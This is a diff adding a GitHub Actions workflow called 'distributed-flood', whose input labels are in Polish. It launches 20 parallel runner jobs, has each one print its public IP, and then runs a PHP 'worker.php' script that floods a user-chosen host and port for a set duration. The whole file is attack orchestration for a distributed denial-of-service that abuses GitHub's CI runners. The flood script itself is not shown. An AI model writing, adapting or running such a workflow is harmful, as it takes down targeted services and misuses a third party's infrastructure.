@@ -1,0 +1,55 @@
+name: distributed-flood
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'Cel (host lub IP)'
+        required: true
+        default: 'example.com'
+      port:
+        description: 'Port'
+        required: true
+        default: '80'
+      duration:
+        description: 'Czas w sekundach'
+        required: true
+        default: '30'
+      workers:
+        description: 'Liczba rownoleglych jobow'
+        required: true
+        default: '20'
+
+jobs:
+  flood:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        worker: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+      fail-fast: false
+      max-parallel: 20
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup PHP
+        uses: shivammathur/setup-php@v2
+        with:
+          php-version: '8.2'
+
+      - name: Show worker IP
+        run: |
+          echo "Worker ${{ matrix.worker }} public IP:"
+          curl -s ifconfig.me
+          echo ""
+
+      - name: Run flood worker ${{ matrix.worker }}
+        run: |
+          php worker.php "${{ github.event.inputs.target }}" "${{ github.event.inputs.port }}" "${{ github.event.inputs.duration }}"
+        timeout-minutes: 5
+
+      - name: Done
+        if: always()
+        run: |
+          echo "Worker ${{ matrix.worker }} finished"
